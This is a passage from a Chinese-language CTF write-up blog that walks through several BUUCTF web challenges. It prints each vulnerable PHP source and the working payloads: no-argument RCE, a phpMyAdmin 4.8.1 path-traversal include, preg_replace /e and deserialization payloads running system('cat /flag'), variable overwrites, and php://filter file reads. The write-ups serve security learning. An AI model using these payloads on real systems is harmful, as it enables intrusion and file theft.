class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span> (!preg_match(<span class="hljs-string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === preg_replace(<span class="hljs-string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<br>            <span class="hljs-keyword">if</span> (!preg_match(<span class="hljs-string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<br>                <span class="hljs-comment">// echo $_GET[&#x27;exp&#x27;];</span><br>                @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>]);<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;还差一点哦！&quot;</span>);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;再好好想想！&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;还想读flag，臭弟弟！&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-comment">// highlight_file(__FILE__);</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>注意看第六行的正则<br><code>&#39;;&#39; === preg_replace(&#39;/[a-z,_]+\((?R)?\)/&#39;</code>这个地方 ?R表示前面的一段的正则 也就是 <code>[a-z,_]+([a-z,_])((?R)?\)</code>这样</p><p>所以 最后也只能是类似这种 print_r(show_source())，可以确定是无参数rce</p><p>直接给结果 <code>highlight_file(array_rand(array_flip(scandir(current(localeconv())))));</code></p><p>多试几次就行</p><h2 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h2><p>怀疑是环境问题，我看到环境就马上去找wp了</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201121818740.png" alt="image-20220112181811674"></p><p>发现有 &#x2F;phpmyadmin&#x2F;</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201121819546.png" alt="image-20220112181916453"></p><p>锁定php版本为4.8.1,百度发现PHP4.8.1有文件包含漏洞</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">phpmyadmin<span class="hljs-regexp">/?target=db_datadict.php%253f/</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>flag<br></code></pre></td></tr></table></figure><h2 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h2><p> [ZJCTF 2019]NiZhuanSiWei 的pro</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://c<span class="hljs-number">5002517</span>-<span class="hljs-number">0</span>e<span class="hljs-number">11</span>-<span class="hljs-number">4374</span>-<span class="hljs-number">8</span>fba-<span class="hljs-number">0</span>ee<span class="hljs-number">811705</span>b<span class="hljs-number">37</span>.node<span class="hljs-number">4</span>.buuoj.cn:<span class="hljs-number">81</span>/?text=data://text/plain;base<span class="hljs-number">64</span>,SSBoYXZlIGEgZHJlYW<span class="hljs-number">0</span>=&amp;file=php://filter/read=convert.base<span class="hljs-number">64</span>-encode/resource=next.php<br></code></pre></td></tr></table></figure><p>得到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;id&#x27;</span>] = <span class="hljs-variable">$id</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">complex</span>(<span class="hljs-params"><span class="hljs-variable">$re</span>, <span class="hljs-variable">$str</span></span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> preg_replace(<br>        <span class="hljs-string">&#x27;/(&#x27;</span> . <span class="hljs-variable">$re</span> . <span class="hljs-string">&#x27;)/ei&#x27;</span>,<br>        <span class="hljs-string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,<br>        <span class="hljs-variable">$str</span><br>    );<br>&#125;<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$re</span> =&gt; <span class="hljs-variable">$str</span>) &#123;<br>    <span class="hljs-keyword">echo</span> complex(<span class="hljs-variable">$re</span>, <span class="hljs-variable">$str</span>). <span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFlag</span>(<span class="hljs-params"></span>)</span>&#123;<br>@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br>&#125;<br><br></code></pre></td></tr></table></figure><div class="code-wrapper"><pre><code class="hljs">这题还真不少东西先说说这个complex 函数的返回值</code></pre></div><blockquote><p><strong>反向引用</strong></p><p>对一个正则表达式模式或部分模式 <strong>两边添加圆括号</strong> 将导致相关 <strong>匹配存储到一个临时缓冲区</strong> 中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 ‘\n’ 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。</p></blockquote><div class="code-wrapper"><pre><code class="hljs">所以这个地方 实际用于替换的字符串是第一个匹配项这个时候 如果我们传入 ` ?.*=$&#123;phpinfo()&#125;` 就相当于 `preg_replace(/(.*)/ie,strtolower(&quot;\\1&quot;),$str)` 就相当于返回自己本身了，然而我们知道PHP字符串有自己解析特性 即 . =&gt; _ 这里大佬给出了答案 替换为 `?S*=$&#123;phpinfo()&#125;` 说实话我不是很明白结合题意，phpinfo =&gt; getFlag</code></pre></div><p>payload: <code>/next.php?\S*=$&#123;getFlag()&#125;&amp;cmd=system(%27cat%20/flag%27);</code></p><h2 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h2><p><a href="https://blog.csdn.net/a3320315/article/details/102945940">https://blog.csdn.net/a3320315/article/details/102945940</a></p><p>大佬的博客</p><h2 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h2><p>一开始是尝试看html源码没啥思路，这东西使劲的刷新然后我也烦，上了个burp</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201131435706.png" alt="image-20220113143537558"></p><p>抓个包  看这个func 和 p的关系，像不像是 func(p) ，顺着这个思路往下</p><p>我一开始尝试了 <code>highlight_file(__FILE__)</code> 然而并没有成功，依据报错信息 index.php</p><p>我构建了 <code>func=highlight_file&amp;p=index.php</code>，就读到源码了，可能是这个题不让用 <code>__FILE__ </code>吧</p><p>咳，实测readFile这里更好使，可以直接复制源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$disable_fun</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-string">&quot;shell_exec&quot;</span>,<span class="hljs-string">&quot;system&quot;</span>,<span class="hljs-string">&quot;passthru&quot;</span>,<span class="hljs-string">&quot;proc_open&quot;</span>,<span class="hljs-string">&quot;show_source&quot;</span>,<span class="hljs-string">&quot;phpinfo&quot;</span>,<span class="hljs-string">&quot;popen&quot;</span>,<span class="hljs-string">&quot;dl&quot;</span>,<span class="hljs-string">&quot;eval&quot;</span>,<span class="hljs-string">&quot;proc_terminate&quot;</span>,<span class="hljs-string">&quot;touch&quot;</span>,<span class="hljs-string">&quot;escapeshellcmd&quot;</span>,<span class="hljs-string">&quot;escapeshellarg&quot;</span>,<span class="hljs-string">&quot;assert&quot;</span>,<span class="hljs-string">&quot;substr_replace&quot;</span>,<span class="hljs-string">&quot;call_user_func_array&quot;</span>,<span class="hljs-string">&quot;call_user_func&quot;</span>,<span class="hljs-string">&quot;array_filter&quot;</span>, <span class="hljs-string">&quot;array_walk&quot;</span>,  <span class="hljs-string">&quot;array_map&quot;</span>,<span class="hljs-string">&quot;registregister_shutdown_function&quot;</span>,<span class="hljs-string">&quot;register_tick_function&quot;</span>,<span class="hljs-string">&quot;filter_var&quot;</span>, <span class="hljs-string">&quot;filter_var_array&quot;</span>, <span class="hljs-string">&quot;uasort&quot;</span>, <span class="hljs-string">&quot;uksort&quot;</span>, <span class="hljs-string">&quot;array_reduce&quot;</span>,<span class="hljs-string">&quot;array_walk&quot;</span>, <span class="hljs-string">&quot;array_walk_recursive&quot;</span>,<span class="hljs-string">&quot;pcntl_exec&quot;</span>,<span class="hljs-string">&quot;fopen&quot;</span>,<span class="hljs-string">&quot;fwrite&quot;</span>,<span class="hljs-string">&quot;file_put_contents&quot;</span>);<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">gettime</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span></span>) </span>&#123;<br>        <span class="hljs-variable">$result</span> = call_user_func(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span>);<br>        <span class="hljs-variable">$a</span>= gettype(<span class="hljs-variable">$result</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> == <span class="hljs-string">&quot;string&quot;</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;&#125;<br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>        <span class="hljs-keyword">var</span> <span class="hljs-variable">$p</span> = <span class="hljs-string">&quot;Y-m-d h:i:s a&quot;</span>;<br>        <span class="hljs-keyword">var</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&quot;date&quot;</span>;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;func != <span class="hljs-string">&quot;&quot;</span>) &#123;<br>                <span class="hljs-keyword">echo</span> gettime(<span class="hljs-keyword">$this</span>-&gt;func, <span class="hljs-keyword">$this</span>-&gt;p);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-variable">$func</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;func&quot;</span>];<br>    <span class="hljs-variable">$p</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;p&quot;</span>];<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$func</span> != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-variable">$func</span> = strtolower(<span class="hljs-variable">$func</span>);<br>        <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$func</span>,<span class="hljs-variable">$disable_fun</span>)) &#123;<br>            <span class="hljs-keyword">echo</span> gettime(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span>);<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Hacker...&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><div class="code-wrapper"><pre><code class="hljs">Func(p) 还可以拓展成 system(command) 这里没有禁用序列化和反序列化函数，也就是说我们可以让一个可以看flag的对象序列化为字符串，最后再释放出来。序列化的字符串gettype处理后是String类型。</code></pre></div><p>于是有</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br>     <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>        <span class="hljs-keyword">var</span> <span class="hljs-variable">$p</span> = <span class="hljs-string">&quot;find / -name flag*&quot;</span>;<br>        <span class="hljs-keyword">var</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&quot;system&quot;</span>;<br>    &#125;<br>    <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> Test();<br>    <span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-variable">$a</span>));<br><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//O%3A4%3A%22Test%22%3A2%3A%7Bs%3A1%3A%22p%22%3Bs%3A18%3A%22find+%2F+-name+flag%2A%22%3Bs%3A4%3A%22func%22%3Bs%3A6%3A%22system%22%3B%7D</span><br></code></pre></td></tr></table></figure><p>注意，这会花费一些时间，毕竟是根目录开始一步步找 锁定位置 <code>/tmp/flagoefiu4r93</code></p><p>然后有</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br>     <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>        <span class="hljs-keyword">var</span> <span class="hljs-variable">$p</span> = <span class="hljs-string">&quot;cat /tmp/flagoefiu4r93&quot;</span>;<br>        <span class="hljs-keyword">var</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&quot;system&quot;</span>;<br>    &#125;<br>    <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> Test();<br>    <span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-variable">$a</span>));<br><br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment">//O%3A4%3A%22Test%22%3A2%3A%7Bs%3A1%3A%22p%22%3Bs%3A22%3A%22cat+%2Ftmp%2Fflagoefiu4r93%22%3Bs%3A4%3A%22func%22%3Bs%3A6%3A%22system%22%3B%7Dunserialize</span><br></code></pre></td></tr></table></figure><p>构造</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/index.php</span> <span class="hljs-meta">HTTP/1.1</span><br>. . .<br><br><span class="apache"><span class="hljs-attribute">func</span>=unserialize&amp;p=O%<span class="hljs-number">3</span>A<span class="hljs-number">4</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>Test%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A<span class="hljs-number">2</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">1</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>p%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>cat+%<span class="hljs-number">2</span>Ftmp%<span class="hljs-number">2</span>Fflagoefiu<span class="hljs-number">4</span>r<span class="hljs-number">93</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">4</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>func%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">6</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>system%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>Dunserialize</span><br></code></pre></td></tr></table></figure><p>就可以getFlag了</p><h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2><p>啥也没有，猜有git泄露。真的有，然而我并没有获得源码只是获得了一些没啥用的资源文件</p><p>去网上嫖别人的代码了🤷‍♂️</p><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><br><span class="hljs-variable">$yds</span> = <span class="hljs-string">&quot;dog&quot;</span>;<br><span class="hljs-variable">$is</span> = <span class="hljs-string">&quot;cat&quot;</span>;<br><span class="hljs-variable">$handsome</span> = <span class="hljs-string">&#x27;yds&#x27;</span>;<br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_POST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;<br>    <span class="hljs-variable">$$x</span> = <span class="hljs-variable">$y</span>;<br>&#125;<br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;<br>    <span class="hljs-variable">$$x</span> = <span class="hljs-variable">$$y</span>;<br>&#125;<br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-variable">$x</span> &amp;&amp; <span class="hljs-variable">$x</span> !== <span class="hljs-string">&#x27;flag&#x27;</span>)&#123;<br>        <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$handsome</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$yds</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>  || <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>)&#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$is</span>);<br>&#125;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;the flag is: &quot;</span>.<span class="hljs-variable">$flag</span>;<br></code></pre></td></tr></table></figure><p>flag.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$flag</span> = file_get_contents(<span class="hljs-string">&#x27;/flag&#x27;</span>);<br></code></pre></td></tr></table></figure><p>期待程序程序执行到 31行</p><p>我们需要满足</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-variable">$x</span> &amp;&amp; <span class="hljs-variable">$x</span> !== <span class="hljs-string">&#x27;flag&#x27;</span>)&#123;<br>...<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]))<br>...    <br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>  || <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>)<br></code></pre></td></tr></table></figure><p>自己变量覆盖这块学的不太好，于是看了看其他师傅的wp</p><h3 id="解法1"><a href="#解法1" class="headerlink" title="解法1"></a>解法1</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;<br>    <span class="hljs-variable">$$x</span> = <span class="hljs-variable">$$y</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个地方 $$x,$$y 全部可控，demo <code>x=$yds,y=$flag</code> &#x3D;&gt; <code>$yds=$flag</code></p><p>有 <code>GET: $yds=$flag</code></p><h3 id="解法2"><a href="#解法2" class="headerlink" title="解法2"></a>解法2</h3><p>这个地方师傅点醒了我 exit 也是一种输出更何况 exit的参数是一个变量</p><p><a href="%E5%B8%88%E5%82%85%E5%8D%9A%E5%AE%A2">https://blog.csdn.net/qq_43622442&#x2F;article&#x2F;details&#x2F;105925473</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;<br>    <span class="hljs-variable">$$x</span> = <span class="hljs-variable">$$y</span>;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>  || <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>)&#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$is</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>GET:is=flag&amp;flag=flag</code></p><h2 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h2><p>打开之后只能查看猫或狗的图片，没有信息泄露</p><p>尝试文件包含</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">index.php?category=php://filter/convert.base64-encode/resource=index.php<br></code></pre></td></tr></table></figure><p>没有成功，不过把后缀去掉就好了，说明这个地方对后缀做了手脚，之后做题可以只传index看返回结果</p><p>base64解码后的结果(扔掉html)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;category&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$file</span>))<br>&#123;<br><span class="hljs-keyword">if</span>( strpos( <span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;woofers&quot;</span> ) !==  <span class="hljs-literal">false</span> || strpos( <span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;meowers&quot;</span> ) !==  <span class="hljs-literal">false</span> || strpos( <span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;index&quot;</span>))&#123;<br><span class="hljs-keyword">include</span> (<span class="hljs-variable">$file</span> . <span class="hljs-string">&#x27;.php&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Sorry, we currently only support woofers and meowers.&quot;</span>;<br>&#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>可以看到 必须是 woofers meowers 或者 index</p><p>那就是要构建一个payload，有上面三者其一但是实际处理的flag</p><p>构造  理由和BUU第一页那个目录穿越一样 include碰到了 &#x2F;于是处理最后一项内容</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">index.php?category=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=index<span class="hljs-regexp">/../</span>flag<br></code></pre></td></tr></table></figure><h2 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h2><p>根据地址栏的提示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://5b8e822a-6993-43bd-8785-06dcc8b2d92d.node4.buuoj.cn:81/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=<br></code></pre></td></tr></table></figure><p>推测出 img参数的加密顺序 str &#x3D;&gt; hex &#x3D;&gt; base64(hex) &#x3D;&gt; base64(base64(hex))</p><p>由此，index.php &#x3D;&gt; 